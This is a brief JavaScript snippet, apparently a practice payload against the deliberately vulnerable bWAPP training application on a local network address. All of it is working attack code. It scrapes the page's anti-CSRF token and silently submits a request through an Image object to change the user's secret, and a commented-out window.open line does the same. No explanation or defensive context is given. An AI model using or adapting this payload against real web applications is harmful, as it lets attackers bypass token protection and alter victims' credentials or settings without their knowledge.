var token = document.getElementsByName("token").item(0).value;
//var target = "http://192.168.1.58/bWAPP/csrf_3.php?secret=SECRET&action=change&token=" + token;
//window.open(target);
var img = new Image();
img.src = "http://192.168.1.58/bWAPP/csrf_3.php?secret=SECRET&action=change&token=" + token;
